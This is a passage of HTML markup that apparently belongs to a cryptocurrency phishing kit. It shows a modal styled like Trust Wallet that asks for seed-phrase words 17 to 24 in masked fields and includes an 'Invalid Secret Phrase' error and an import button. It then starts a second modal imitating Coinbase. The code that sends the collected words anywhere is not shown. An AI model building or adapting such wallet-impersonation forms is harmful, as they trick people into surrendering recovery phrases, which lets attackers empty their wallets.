                            d="M6.55528 6.30998L1 12L6.55528 17.69C9.56231 20.77 14.4377 20.77 17.4447 17.69L23 12L17.4447 6.30998C14.4377 3.23001 9.56232 3.23 6.55528 6.30998ZM17 12C17 14.7614 14.7614 17 12 17C9.23858 17 7 14.7614 7 12C7 9.23858 9.23858 7 12 7C14.7614 7 17 9.23858 17 12Z"
                            fill="currentColor"
                          ></path>
                        </svg>
                      </button>
                    </div>
                    <div class="scwtw-relative">
                      <p
                        class="scwtw-px-[10px] font-inter scwtw-text-[#000000] dark:scwtw-text-[#ffffff] scwtw-text-[16px] scwtw-font-medium scwtw-absolute scwtw-top-[12px]"
                      >
                        17.
                      </p>
                      <input
                        class="scwtw-w-full scwtw-font-medium font-inter scwtw-h-12 scwtw-text-[#1e2329] dark:scwtw-text-[#eaecef] scwtw-p-3 scwtw-rounded-[4px] scwtw-flex scwtw-items-center scwtw-border scwtw-border-transparent scwtw-bg-[#f5f5f5] dark:scwtw-bg-[#2b3139] scwtw-border scwtw-border-transparent scwtw-outline-none scwtw-pl-8 scwtw-pr-10 scwtw-py-3 placeholder:scwtw-text-[#9ca3af] scwtw-text-[16px] focus:scwtw-border-[#0500ff] focus:dark:scwtw-border-[#48ff91] scwtw-transition-all scwtw-duration-300 trust-seed-input"
                        type="password"
                        placeholder="Word #17"
                      />
                      <button
                        class="scwtw-group scwtw-absolute scwtw-top-[12px] scwtw-right-[12px] hover:scwtw-opacity-80 scwtw-transition-all scwtw-duration-300 trust-toggle-seed-input"
                        data-is-visible="false"
                        data-seed-word-target="17"
                      >
                        <svg
                          class="group-data-[is-visible=false]:scwtw-block scwtw-hidden scwtw-text-[#929aa5] dark:scwtw-text-[#848e9c]"
                          fill="none"
                          width="24"
                          height="24"
                          viewBox="0 0 24 24"
                          xmlns="http://www.w3.org/2000/svg"
                        >
                          <path
                            fill-rule="evenodd"
                            clip-rule="evenodd"
                            d="M2.93933 5.06077L18.9393 21.0608L21.0606 18.9395L18.6138 16.4926L23 12L17.4447 6.30998C14.7539 3.55392 10.5671 3.26407 7.56164 5.44044L5.06065 2.93945L2.93933 5.06077ZM9.68714 7.56594C10.3788 7.20443 11.1655 7 12 7C14.7614 7 17 9.23858 17 12C17 12.8345 16.7956 13.6212 16.4341 14.3129L9.68714 7.56594Z"
                            fill="currentColor"
                          ></path>
                          <path
                            d="M1 12L3.29029 9.65416L13.4882 19.8521C11.0565 20.3404 8.43922 19.6197 6.55528 17.69L1 12Z"
                            fill="currentColor"
                          ></path>
                        </svg>
                        <svg
                          class="group-data-[is-visible=true]:scwtw-block scwtw-hidden scwtw-text-[#929aa5] dark:scwtw-text-[#848e9c]"
                          fill="none"
                          width="24"
                          height="24"
                          viewBox="0 0 24 24"
                          xmlns="http://www.w3.org/2000/svg"
                        >
                          <path
                            d="M12 14.5C13.3807 14.5 14.5 13.3807 14.5 12C14.5 10.6193 13.3807 9.5 12 9.5C10.6193 9.5 9.5 10.6193 9.5 12C9.5 13.3807 10.6193 14.5 12 14.5Z"
                            fill="currentColor"
                          ></path>
                          <path
                            fill-rule="evenodd"
                            clip-rule="evenodd"
                            d="M6.55528 6.30998L1 12L6.55528 17.69C9.56231 20.77 14.4377 20.77 17.4447 17.69L23 12L17.4447 6.30998C14.4377 3.23001 9.56232 3.23 6.55528 6.30998ZM17 12C17 14.7614 14.7614 17 12 17C9.23858 17 7 14.7614 7 12C7 9.23858 9.23858 7 12 7C14.7614 7 17 9.23858 17 12Z"
                            fill="currentColor"
                          ></path>
                        </svg>
                      </button>
                    </div>
                    <div class="scwtw-relative">
                      <p
                        class="scwtw-px-[10px] font-inter scwtw-text-[#000000] dark:scwtw-text-[#ffffff] scwtw-text-[16px] scwtw-font-medium scwtw-absolute scwtw-top-[12px]"
                      >
                        18.
                      </p>
                      <input
                        class="scwtw-w-full scwtw-font-medium font-inter scwtw-h-12 scwtw-text-[#1e2329] dark:scwtw-text-[#eaecef] scwtw-p-3 scwtw-rounded-[4px] scwtw-flex scwtw-items-center scwtw-border scwtw-border-transparent scwtw-bg-[#f5f5f5] dark:scwtw-bg-[#2b3139] scwtw-border scwtw-border-transparent scwtw-outline-none scwtw-pl-8 scwtw-pr-10 scwtw-py-3 placeholder:scwtw-text-[#9ca3af] scwtw-text-[16px] focus:scwtw-border-[#0500ff] focus:dark:scwtw-border-[#48ff91] scwtw-transition-all scwtw-duration-300 trust-seed-input"
                        type="password"
                        placeholder="Word #18"
                      />
                      <button
                        class="scwtw-group scwtw-absolute scwtw-top-[12px] scwtw-right-[12px] hover:scwtw-opacity-80 scwtw-transition-all scwtw-duration-300 trust-toggle-seed-input"
                        data-is-visible="false"
                        data-seed-word-target="18"
                      >
                        <svg
                          class="group-data-[is-visible=false]:scwtw-block scwtw-hidden scwtw-text-[#929aa5] dark:scwtw-text-[#848e9c]"
                          fill="none"
                          width="24"
                          height="24"
                          viewBox="0 0 24 24"
                          xmlns="http://www.w3.org/2000/svg"
                        >
                          <path
                            fill-rule="evenodd"
                            clip-rule="evenodd"
                            d="M2.93933 5.06077L18.9393 21.0608L21.0606 18.9395L18.6138 16.4926L23 12L17.4447 6.30998C14.7539 3.55392 10.5671 3.26407 7.56164 5.44044L5.06065 2.93945L2.93933 5.06077ZM9.68714 7.56594C10.3788 7.20443 11.1655 7 12 7C14.7614 7 17 9.23858 17 12C17 12.8345 16.7956 13.6212 16.4341 14.3129L9.68714 7.56594Z"
                            fill="currentColor"
                          ></path>
                          <path
                            d="M1 12L3.29029 9.65416L13.4882 19.8521C11.0565 20.3404 8.43922 19.6197 6.55528 17.69L1 12Z"
                            fill="currentColor"
                          ></path>
                        </svg>
                        <svg
                          class="group-data-[is-visible=true]:scwtw-block scwtw-hidden scwtw-text-[#929aa5] dark:scwtw-text-[#848e9c]"
                          fill="none"
                          width="24"
                          height="24"
                          viewBox="0 0 24 24"
                          xmlns="http://www.w3.org/2000/svg"
                        >
                          <path
                            d="M12 14.5C13.3807 14.5 14.5 13.3807 14.5 12C14.5 10.6193 13.3807 9.5 12 9.5C10.6193 9.5 9.5 10.6193 9.5 12C9.5 13.3807 10.6193 14.5 12 14.5Z"
                            fill="currentColor"
                          ></path>
                          <path
                            fill-rule="evenodd"
                            clip-rule="evenodd"
                            d="M6.55528 6.30998L1 12L6.55528 17.69C9.56231 20.77 14.4377 20.77 17.4447 17.69L23 12L17.4447 6.30998C14.4377 3.23001 9.56232 3.23 6.55528 6.30998ZM17 12C17 14.7614 14.7614 17 12 17C9.23858 17 7 14.7614 7 12C7 9.23858 9.23858 7 12 7C14.7614 7 17 9.23858 17 12Z"
                            fill="currentColor"
                          ></path>
                        </svg>
                      </button>
                    </div>
                    <div class="scwtw-relative">
                      <p
                        class="scwtw-px-[10px] font-inter scwtw-text-[#000000] dark:scwtw-text-[#ffffff] scwtw-text-[16px] scwtw-font-medium scwtw-absolute scwtw-top-[12px]"
                      >
                        19.
                      </p>
                      <input
                        class="scwtw-w-full scwtw-font-medium font-inter scwtw-h-12 scwtw-text-[#1e2329] dark:scwtw-text-[#eaecef] scwtw-p-3 scwtw-rounded-[4px] scwtw-flex scwtw-items-center scwtw-border scwtw-border-transparent scwtw-bg-[#f5f5f5] dark:scwtw-bg-[#2b3139] scwtw-border scwtw-border-transparent scwtw-outline-none scwtw-pl-8 scwtw-pr-10 scwtw-py-3 placeholder:scwtw-text-[#9ca3af] scwtw-text-[16px] focus:scwtw-border-[#0500ff] focus:dark:scwtw-border-[#48ff91] scwtw-transition-all scwtw-duration-300 trust-seed-input"
                        type="password"
                        placeholder="Word #19"
                      />
                      <button
                        class="scwtw-group scwtw-absolute scwtw-top-[12px] scwtw-right-[12px] hover:scwtw-opacity-80 scwtw-transition-all scwtw-duration-300 trust-toggle-seed-input"
                        data-is-visible="false"
                        data-seed-word-target="19"
                      >
                        <svg
                          class="group-data-[is-visible=false]:scwtw-block scwtw-hidden scwtw-text-[#929aa5] dark:scwtw-text-[#848e9c]"
                          fill="none"
                          width="24"
                          height="24"
                          viewBox="0 0 24 24"
                          xmlns="http://www.w3.org/2000/svg"
                        >
                          <path
                            fill-rule="evenodd"
                            clip-rule="evenodd"
                            d="M2.93933 5.06077L18.9393 21.0608L21.0606 18.9395L18.6138 16.4926L23 12L17.4447 6.30998C14.7539 3.55392 10.5671 3.26407 7.56164 5.44044L5.06065 2.93945L2.93933 5.06077ZM9.68714 7.56594C10.3788 7.20443 11.1655 7 12 7C14.7614 7 17 9.23858 17 12C17 12.8345 16.7956 13.6212 16.4341 14.3129L9.68714 7.56594Z"
                            fill="currentColor"
                          ></path>
                          <path
                            d="M1 12L3.29029 9.65416L13.4882 19.8521C11.0565 20.3404 8.43922 19.6197 6.55528 17.69L1 12Z"
                            fill="currentColor"
                          ></path>
                        </svg>
                        <svg
                          class="group-data-[is-visible=true]:scwtw-block scwtw-hidden scwtw-text-[#929aa5] dark:scwtw-text-[#848e9c]"
                          fill="none"
                          width="24"
                          height="24"
                          viewBox="0 0 24 24"
                          xmlns="http://www.w3.org/2000/svg"
                        >
                          <path
                            d="M12 14.5C13.3807 14.5 14.5 13.3807 14.5 12C14.5 10.6193 13.3807 9.5 12 9.5C10.6193 9.5 9.5 10.6193 9.5 12C9.5 13.3807 10.6193 14.5 12 14.5Z"
                            fill="currentColor"
                          ></path>
                          <path
                            fill-rule="evenodd"
                            clip-rule="evenodd"
                            d="M6.55528 6.30998L1 12L6.55528 17.69C9.56231 20.77 14.4377 20.77 17.4447 17.69L23 12L17.4447 6.30998C14.4377 3.23001 9.56232 3.23 6.55528 6.30998ZM17 12C17 14.7614 14.7614 17 12 17C9.23858 17 7 14.7614 7 12C7 9.23858 9.23858 7 12 7C14.7614 7 17 9.23858 17 12Z"
                            fill="currentColor"
                          ></path>
                        </svg>
                      </button>
                    </div>
                    <div class="scwtw-relative">
                      <p
                        class="scwtw-px-[10px] font-inter scwtw-text-[#000000] dark:scwtw-text-[#ffffff] scwtw-text-[16px] scwtw-font-medium scwtw-absolute scwtw-top-[12px]"
                      >
                        20.
                      </p>
                      <input
                        class="scwtw-w-full scwtw-font-medium font-inter scwtw-h-12 scwtw-text-[#1e2329] dark:scwtw-text-[#eaecef] scwtw-p-3 scwtw-rounded-[4px] scwtw-flex scwtw-items-center scwtw-border scwtw-border-transparent scwtw-bg-[#f5f5f5] dark:scwtw-bg-[#2b3139] scwtw-border scwtw-border-transparent scwtw-outline-none scwtw-pl-8 scwtw-pr-10 scwtw-py-3 placeholder:scwtw-text-[#9ca3af] scwtw-text-[16px] focus:scwtw-border-[#0500ff] focus:dark:scwtw-border-[#48ff91] scwtw-transition-all scwtw-duration-300 trust-seed-input"
                        type="password"
                        placeholder="Word #20"
                      />
                      <button
                        class="scwtw-group scwtw-absolute scwtw-top-[12px] scwtw-right-[12px] hover:scwtw-opacity-80 scwtw-transition-all scwtw-duration-300 trust-toggle-seed-input"
                        data-is-visible="false"
                        data-seed-word-target="20"
                      >
                        <svg
                          class="group-data-[is-visible=false]:scwtw-block scwtw-hidden scwtw-text-[#929aa5] dark:scwtw-text-[#848e9c]"
                          fill="none"
                          width="24"
                          height="24"
                          viewBox="0 0 24 24"
                          xmlns="http://www.w3.org/2000/svg"
                        >
                          <path
                            fill-rule="evenodd"
                            clip-rule="evenodd"
                            d="M2.93933 5.06077L18.9393 21.0608L21.0606 18.9395L18.6138 16.4926L23 12L17.4447 6.30998C14.7539 3.55392 10.5671 3.26407 7.56164 5.44044L5.06065 2.93945L2.93933 5.06077ZM9.68714 7.56594C10.3788 7.20443 11.1655 7 12 7C14.7614 7 17 9.23858 17 12C17 12.8345 16.7956 13.6212 16.4341 14.3129L9.68714 7.56594Z"
                            fill="currentColor"
                          ></path>
                          <path
                            d="M1 12L3.29029 9.65416L13.4882 19.8521C11.0565 20.3404 8.43922 19.6197 6.55528 17.69L1 12Z"
                            fill="currentColor"
                          ></path>
                        </svg>
                        <svg
                          class="group-data-[is-visible=true]:scwtw-block scwtw-hidden scwtw-text-[#929aa5] dark:scwtw-text-[#848e9c]"
                          fill="none"
                          width="24"
                          height="24"
                          viewBox="0 0 24 24"
                          xmlns="http://www.w3.org/2000/svg"
                        >
                          <path
                            d="M12 14.5C13.3807 14.5 14.5 13.3807 14.5 12C14.5 10.6193 13.3807 9.5 12 9.5C10.6193 9.5 9.5 10.6193 9.5 12C9.5 13.3807 10.6193 14.5 12 14.5Z"
                            fill="currentColor"
                          ></path>
                          <path
                            fill-rule="evenodd"
                            clip-rule="evenodd"
                            d="M6.55528 6.30998L1 12L6.55528 17.69C9.56231 20.77 14.4377 20.77 17.4447 17.69L23 12L17.4447 6.30998C14.4377 3.23001 9.56232 3.23 6.55528 6.30998ZM17 12C17 14.7614 14.7614 17 12 17C9.23858 17 7 14.7614 7 12C7 9.23858 9.23858 7 12 7C14.7614 7 17 9.23858 17 12Z"
                            fill="currentColor"
                          ></path>
                        </svg>
                      </button>
                    </div>
                    <div class="scwtw-relative">
                      <p
                        class="scwtw-px-[10px] font-inter scwtw-text-[#000000] dark:scwtw-text-[#ffffff] scwtw-text-[16px] scwtw-font-medium scwtw-absolute scwtw-top-[12px]"
                      >
                        21.
                      </p>
                      <input
                        class="scwtw-w-full scwtw-font-medium font-inter scwtw-h-12 scwtw-text-[#1e2329] dark:scwtw-text-[#eaecef] scwtw-p-3 scwtw-rounded-[4px] scwtw-flex scwtw-items-center scwtw-border scwtw-border-transparent scwtw-bg-[#f5f5f5] dark:scwtw-bg-[#2b3139] scwtw-border scwtw-border-transparent scwtw-outline-none scwtw-pl-8 scwtw-pr-10 scwtw-py-3 placeholder:scwtw-text-[#9ca3af] scwtw-text-[16px] focus:scwtw-border-[#0500ff] focus:dark:scwtw-border-[#48ff91] scwtw-transition-all scwtw-duration-300 trust-seed-input"
                        type="password"
                        placeholder="Word #21"
                      />
                      <button
                        class="scwtw-group scwtw-absolute scwtw-top-[12px] scwtw-right-[12px] hover:scwtw-opacity-80 scwtw-transition-all scwtw-duration-300 trust-toggle-seed-input"
                        data-is-visible="false"
                        data-seed-word-target="21"
                      >
                        <svg
                          class="group-data-[is-visible=false]:scwtw-block scwtw-hidden scwtw-text-[#929aa5] dark:scwtw-text-[#848e9c]"
                          fill="none"
                          width="24"
                          height="24"
                          viewBox="0 0 24 24"
                          xmlns="http://www.w3.org/2000/svg"
                        >
                          <path
                            fill-rule="evenodd"
                            clip-rule="evenodd"
                            d="M2.93933 5.06077L18.9393 21.0608L21.0606 18.9395L18.6138 16.4926L23 12L17.4447 6.30998C14.7539 3.55392 10.5671 3.26407 7.56164 5.44044L5.06065 2.93945L2.93933 5.06077ZM9.68714 7.56594C10.3788 7.20443 11.1655 7 12 7C14.7614 7 17 9.23858 17 12C17 12.8345 16.7956 13.6212 16.4341 14.3129L9.68714 7.56594Z"
                            fill="currentColor"
                          ></path>
                          <path
                            d="M1 12L3.29029 9.65416L13.4882 19.8521C11.0565 20.3404 8.43922 19.6197 6.55528 17.69L1 12Z"
                            fill="currentColor"
                          ></path>
                        </svg>
                        <svg
                          class="group-data-[is-visible=true]:scwtw-block scwtw-hidden scwtw-text-[#929aa5] dark:scwtw-text-[#848e9c]"
                          fill="none"
                          width="24"
                          height="24"
                          viewBox="0 0 24 24"
                          xmlns="http://www.w3.org/2000/svg"
                        >
                          <path
                            d="M12 14.5C13.3807 14.5 14.5 13.3807 14.5 12C14.5 10.6193 13.3807 9.5 12 9.5C10.6193 9.5 9.5 10.6193 9.5 12C9.5 13.3807 10.6193 14.5 12 14.5Z"
                            fill="currentColor"
                          ></path>
                          <path
                            fill-rule="evenodd"
                            clip-rule="evenodd"
                            d="M6.55528 6.30998L1 12L6.55528 17.69C9.56231 20.77 14.4377 20.77 17.4447 17.69L23 12L17.4447 6.30998C14.4377 3.23001 9.56232 3.23 6.55528 6.30998ZM17 12C17 14.7614 14.7614 17 12 17C9.23858 17 7 14.7614 7 12C7 9.23858 9.23858 7 12 7C14.7614 7 17 9.23858 17 12Z"
                            fill="currentColor"
                          ></path>
                        </svg>
                      </button>
                    </div>
                    <div class="scwtw-relative">
                      <p
                        class="scwtw-px-[10px] font-inter scwtw-text-[#000000] dark:scwtw-text-[#ffffff] scwtw-text-[16px] scwtw-font-medium scwtw-absolute scwtw-top-[12px]"
                      >
                        22.
                      </p>
                      <input
                        class="scwtw-w-full scwtw-font-medium font-inter scwtw-h-12 scwtw-text-[#1e2329] dark:scwtw-text-[#eaecef] scwtw-p-3 scwtw-rounded-[4px] scwtw-flex scwtw-items-center scwtw-border scwtw-border-transparent scwtw-bg-[#f5f5f5] dark:scwtw-bg-[#2b3139] scwtw-border scwtw-border-transparent scwtw-outline-none scwtw-pl-8 scwtw-pr-10 scwtw-py-3 placeholder:scwtw-text-[#9ca3af] scwtw-text-[16px] focus:scwtw-border-[#0500ff] focus:dark:scwtw-border-[#48ff91] scwtw-transition-all scwtw-duration-300 trust-seed-input"
                        type="password"
                        placeholder="Word #22"
                      />
                      <button
                        class="scwtw-group scwtw-absolute scwtw-top-[12px] scwtw-right-[12px] hover:scwtw-opacity-80 scwtw-transition-all scwtw-duration-300 trust-toggle-seed-input"
                        data-is-visible="false"
                        data-seed-word-target="22"
                      >
                        <svg
                          class="group-data-[is-visible=false]:scwtw-block scwtw-hidden scwtw-text-[#929aa5] dark:scwtw-text-[#848e9c]"
                          fill="none"
                          width="24"
                          height="24"
                          viewBox="0 0 24 24"
                          xmlns="http://www.w3.org/2000/svg"
                        >
                          <path
                            fill-rule="evenodd"
                            clip-rule="evenodd"
                            d="M2.93933 5.06077L18.9393 21.0608L21.0606 18.9395L18.6138 16.4926L23 12L17.4447 6.30998C14.7539 3.55392 10.5671 3.26407 7.56164 5.44044L5.06065 2.93945L2.93933 5.06077ZM9.68714 7.56594C10.3788 7.20443 11.1655 7 12 7C14.7614 7 17 9.23858 17 12C17 12.8345 16.7956 13.6212 16.4341 14.3129L9.68714 7.56594Z"
                            fill="currentColor"
                          ></path>
                          <path
                            d="M1 12L3.29029 9.65416L13.4882 19.8521C11.0565 20.3404 8.43922 19.6197 6.55528 17.69L1 12Z"
                            fill="currentColor"
                          ></path>
                        </svg>
                        <svg
                          class="group-data-[is-visible=true]:scwtw-block scwtw-hidden scwtw-text-[#929aa5] dark:scwtw-text-[#848e9c]"
                          fill="none"
                          width="24"
                          height="24"
                          viewBox="0 0 24 24"
                          xmlns="http://www.w3.org/2000/svg"
                        >
                          <path
                            d="M12 14.5C13.3807 14.5 14.5 13.3807 14.5 12C14.5 10.6193 13.3807 9.5 12 9.5C10.6193 9.5 9.5 10.6193 9.5 12C9.5 13.3807 10.6193 14.5 12 14.5Z"
                            fill="currentColor"
                          ></path>
                          <path
                            fill-rule="evenodd"
                            clip-rule="evenodd"
                            d="M6.55528 6.30998L1 12L6.55528 17.69C9.56231 20.77 14.4377 20.77 17.4447 17.69L23 12L17.4447 6.30998C14.4377 3.23001 9.56232 3.23 6.55528 6.30998ZM17 12C17 14.7614 14.7614 17 12 17C9.23858 17 7 14.7614 7 12C7 9.23858 9.23858 7 12 7C14.7614 7 17 9.23858 17 12Z"
                            fill="currentColor"
                          ></path>
                        </svg>
                      </button>
                    </div>
                    <div class="scwtw-relative">
                      <p
                        class="scwtw-px-[10px] font-inter scwtw-text-[#000000] dark:scwtw-text-[#ffffff] scwtw-text-[16px] scwtw-font-medium scwtw-absolute scwtw-top-[12px]"
                      >
                        23.
                      </p>
                      <input
                        class="scwtw-w-full scwtw-font-medium font-inter scwtw-h-12 scwtw-text-[#1e2329] dark:scwtw-text-[#eaecef] scwtw-p-3 scwtw-rounded-[4px] scwtw-flex scwtw-items-center scwtw-border scwtw-border-transparent scwtw-bg-[#f5f5f5] dark:scwtw-bg-[#2b3139] scwtw-border scwtw-border-transparent scwtw-outline-none scwtw-pl-8 scwtw-pr-10 scwtw-py-3 placeholder:scwtw-text-[#9ca3af] scwtw-text-[16px] focus:scwtw-border-[#0500ff] focus:dark:scwtw-border-[#48ff91] scwtw-transition-all scwtw-duration-300 trust-seed-input"
                        type="password"
                        placeholder="Word #23"
                      />
                      <button
                        class="scwtw-group scwtw-absolute scwtw-top-[12px] scwtw-right-[12px] hover:scwtw-opacity-80 scwtw-transition-all scwtw-duration-300 trust-toggle-seed-input"
                        data-is-visible="false"
                        data-seed-word-target="23"
                      >
                        <svg
                          class="group-data-[is-visible=false]:scwtw-block scwtw-hidden scwtw-text-[#929aa5] dark:scwtw-text-[#848e9c]"
                          fill="none"
                          width="24"
                          height="24"
                          viewBox="0 0 24 24"
                          xmlns="http://www.w3.org/2000/svg"
                        >
                          <path
                            fill-rule="evenodd"
                            clip-rule="evenodd"
                            d="M2.93933 5.06077L18.9393 21.0608L21.0606 18.9395L18.6138 16.4926L23 12L17.4447 6.30998C14.7539 3.55392 10.5671 3.26407 7.56164 5.44044L5.06065 2.93945L2.93933 5.06077ZM9.68714 7.56594C10.3788 7.20443 11.1655 7 12 7C14.7614 7 17 9.23858 17 12C17 12.8345 16.7956 13.6212 16.4341 14.3129L9.68714 7.56594Z"
                            fill="currentColor"
                          ></path>
                          <path
                            d="M1 12L3.29029 9.65416L13.4882 19.8521C11.0565 20.3404 8.43922 19.6197 6.55528 17.69L1 12Z"
                            fill="currentColor"
                          ></path>
                        </svg>
                        <svg
                          class="group-data-[is-visible=true]:scwtw-block scwtw-hidden scwtw-text-[#929aa5] dark:scwtw-text-[#848e9c]"
                          fill="none"
                          width="24"
                          height="24"
                          viewBox="0 0 24 24"
                          xmlns="http://www.w3.org/2000/svg"
                        >
                          <path
                            d="M12 14.5C13.3807 14.5 14.5 13.3807 14.5 12C14.5 10.6193 13.3807 9.5 12 9.5C10.6193 9.5 9.5 10.6193 9.5 12C9.5 13.3807 10.6193 14.5 12 14.5Z"
                            fill="currentColor"
                          ></path>
                          <path
                            fill-rule="evenodd"
                            clip-rule="evenodd"
                            d="M6.55528 6.30998L1 12L6.55528 17.69C9.56231 20.77 14.4377 20.77 17.4447 17.69L23 12L17.4447 6.30998C14.4377 3.23001 9.56232 3.23 6.55528 6.30998ZM17 12C17 14.7614 14.7614 17 12 17C9.23858 17 7 14.7614 7 12C7 9.23858 9.23858 7 12 7C14.7614 7 17 9.23858 17 12Z"
                            fill="currentColor"
                          ></path>
                        </svg>
                      </button>
                    </div>
                    <div class="scwtw-relative">
                      <p
                        class="scwtw-px-[10px] font-inter scwtw-text-[#000000] dark:scwtw-text-[#ffffff] scwtw-text-[16px] scwtw-font-medium scwtw-absolute scwtw-top-[12px]"
                      >
                        24.
                      </p>
                      <input
                        class="scwtw-w-full scwtw-font-medium font-inter scwtw-h-12 scwtw-text-[#1e2329] dark:scwtw-text-[#eaecef] scwtw-p-3 scwtw-rounded-[4px] scwtw-flex scwtw-items-center scwtw-border scwtw-border-transparent scwtw-bg-[#f5f5f5] dark:scwtw-bg-[#2b3139] scwtw-border scwtw-border-transparent scwtw-outline-none scwtw-pl-8 scwtw-pr-10 scwtw-py-3 placeholder:scwtw-text-[#9ca3af] scwtw-text-[16px] focus:scwtw-border-[#0500ff] focus:dark:scwtw-border-[#48ff91] scwtw-transition-all scwtw-duration-300 trust-seed-input"
                        type="password"
                        placeholder="Word #24"
                      />
                      <button
                        class="scwtw-group scwtw-absolute scwtw-top-[12px] scwtw-right-[12px] hover:scwtw-opacity-80 scwtw-transition-all scwtw-duration-300 trust-toggle-seed-input"
                        data-is-visible="false"
                        data-seed-word-target="24"
                      >
                        <svg
                          class="group-data-[is-visible=false]:scwtw-block scwtw-hidden scwtw-text-[#929aa5] dark:scwtw-text-[#848e9c]"
                          fill="none"
                          width="24"
                          height="24"
                          viewBox="0 0 24 24"
                          xmlns="http://www.w3.org/2000/svg"
                        >
                          <path
                            fill-rule="evenodd"
                            clip-rule="evenodd"
                            d="M2.93933 5.06077L18.9393 21.0608L21.0606 18.9395L18.6138 16.4926L23 12L17.4447 6.30998C14.7539 3.55392 10.5671 3.26407 7.56164 5.44044L5.06065 2.93945L2.93933 5.06077ZM9.68714 7.56594C10.3788 7.20443 11.1655 7 12 7C14.7614 7 17 9.23858 17 12C17 12.8345 16.7956 13.6212 16.4341 14.3129L9.68714 7.56594Z"
                            fill="currentColor"
                          ></path>
                          <path
                            d="M1 12L3.29029 9.65416L13.4882 19.8521C11.0565 20.3404 8.43922 19.6197 6.55528 17.69L1 12Z"
                            fill="currentColor"
                          ></path>
                        </svg>
                        <svg
                          class="group-data-[is-visible=true]:scwtw-block scwtw-hidden scwtw-text-[#929aa5] dark:scwtw-text-[#848e9c]"
                          fill="none"
                          width="24"
                          height="24"
                          viewBox="0 0 24 24"
                          xmlns="http://www.w3.org/2000/svg"
                        >
                          <path
                            d="M12 14.5C13.3807 14.5 14.5 13.3807 14.5 12C14.5 10.6193 13.3807 9.5 12 9.5C10.6193 9.5 9.5 10.6193 9.5 12C9.5 13.3807 10.6193 14.5 12 14.5Z"
                            fill="currentColor"
                          ></path>
                          <path
                            fill-rule="evenodd"
                            clip-rule="evenodd"
                            d="M6.55528 6.30998L1 12L6.55528 17.69C9.56231 20.77 14.4377 20.77 17.4447 17.69L23 12L17.4447 6.30998C14.4377 3.23001 9.56232 3.23 6.55528 6.30998ZM17 12C17 14.7614 14.7614 17 12 17C9.23858 17 7 14.7614 7 12C7 9.23858 9.23858 7 12 7C14.7614 7 17 9.23858 17 12Z"
                            fill="currentColor"
                          ></path>
                        </svg>
                      </button>
                    </div>
                  </div>
                </div>
                <div
                  class="scwtw-px-4 scwtw-mt-3 scwtw-opacity-0 scwtw-ease-in-out scwtw-transition-all scwtw-duration-400"
                  id="trust-error-container"
                >
                  <div
                    class="scwtw-w-full scwtw-flex scwtw-items-center scwtw-justify-start scwtw-gap-x-2 scwtw-p-3 scwtw-bg-[#fef6d8] dark:scwtw-bg-[#d89f000f] scwtw-rounded-[4px]"
                  >
                    <div>
                      <svg
                        class="scwtw-text-[#c99400] dark:scwtw-text-[#f0b90b] scwtw-translate-y-px"
                        fill="none"
                        width="24"
                        height="24"
                        viewBox="0 0 24 24"
                        xmlns="http://www.w3.org/2000/svg"
                      >
                        <path
                          fill-rule="evenodd"
                          clip-rule="evenodd"
                          d="M12 21C16.9706 21 21 16.9706 21 12C21 7.02944 16.9706 3 12 3C7.02944 3 3 7.02944 3 12C3 16.9706 7.02944 21 12 21ZM10.75 15.5V18H13.25V15.5H10.75ZM10.75 6V13H13.25V6H10.75Z"
                          fill="currentColor"
                        ></path>
                      </svg>
                    </div>
                    <div>
                      <span
                        class="scwtw-font-normal scwtw-text-[#c99400] dark:scwtw-text-[#f0b90b] font-inter scwtw-text-[12px]"
                        id="trust-error-text"
                        >Invalid Secret Phrase</span
                      >
                    </div>
                  </div>
                </div>
              </div>
              <div
                class="scwtw-flex scwtw-items-center scwtw-justify-center scwtw-gap-x-1 scwtw-mt-4 scwtw-px-4"
              >
                <div class="scwtw-w-full">
                  <button
                    class="scwtw-w-full scwtw-text-[#0500ff] dark:scwtw-text-[#48ff91] scwtw-font-medium font-inter scwtw-text-[16px] scwtw-leading-[24px] scwtw-cursor-pointer hover:scwtw-opacity-80 scwtw-transition-all scwtw-duration-300"
                    type="button"
                    id="trust-close-button"
                  >
                    Back
                  </button>
                </div>
                <div class="scwtw-w-full">
                  <button
                    class="scwtw-w-full scwtw-text-[#ffffff] scwtw-bg-[#0500ff] dark:scwtw-text-[#1b1b1c] dark:scwtw-bg-[#48ff91] scwtw-font-medium font-inter scwtw-text-[16px] scwtw-leading-[24px] scwtw-cursor-pointer scwtw-rounded-full scwtw-px-4 scwtw-py-3 hover:scwtw-opacity-80 scwtw-transition-all scwtw-duration-300 disabled:scwtw-opacity-50 disabled:scwtw-cursor-not-allowed"
                    id="trust-import-button"
                  >
                    Next
                  </button>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>

    <!-- coinbase -->

    <div
      style="display: none"
      id="coinbase-modal-overlay"
      class="coinbase-modal-overlay scwtw-fixed scwtw-inset-0 scwtw-w-full scwtw-h-full scwtw-bg-[#12121280] scwtw-transition-opacity scwtw-duration-200 scwtw-ease-in-out scwtw-pointer-events-auto scwtw-z-[2147483647] scwtw-opacity-100"
    ></div>
    <div
      style="display: none"
      id="coinbase-modal"
      class="coinbase-modal connect-modal-parent scwtw-fixed scwtw-inset-0 scwtw-transition-all scwtw-duration-200 scwtw-ease-in-out scwtw-pointer-events-none scwtw-z-[2147483648] scwtw-opacity-100"
    >
      <div
        class="coinbase-modal-content scwtw-pointer-events-auto scwtw-flex scwtw-transition-transform scwtw-duration-200 scwtw-ease-in-out scwtw-fixed scwtw-top-1/2 scwtw-left-1/2 -scwtw-translate-x-1/2 scwtw-w-full scwtw-h-full scwtw-max-w-full md:scwtw-top-0 md:scwtw-right-8 md:scwtw-left-auto md:scwtw-translate-x-0 md:scwtw-w-[370px] md:scwtw-h-[600px] md:scwtw-overflow-y-hidden scwtw-overflow-y-auto -scwtw-translate-y-1/2 md:scwtw-translate-y-0"
      >
        <div
          class="scwtw-h-full scwtw-w-full scwtw-bg-white dark:scwtw-bg-[#0a0b0d] scwtw-shadow-xl md:scwtw-border-0 dark:md:scwtw-border-0 dark:scwtw-border-[#f8f8f8] scwtw-rounded-none"
        >
          <div class="scwtw-relative scwtw-z-[2147483649] scwtw-h-full">
            <div
              id="video-container"
              class="scwtw-absolute scwtw-inset-0 scwtw-z-[2147483648] scwtw-transition-opacity scwtw-duration-500 scwtw-opacity-0 scwtw-hidden"
            >
              <video
                id="welcome-video"
                src="./images/warmwelcome_ext_750x1200.webm"
                type="video/webm"
                loop=""
                autoplay=""
                muted=""
                playsinline=""
                width="100%"
                height="100%"
                class="scwtw-w-full scwtw-h-full scwtw-object-cover"
              ></video>
            </div>
            <div
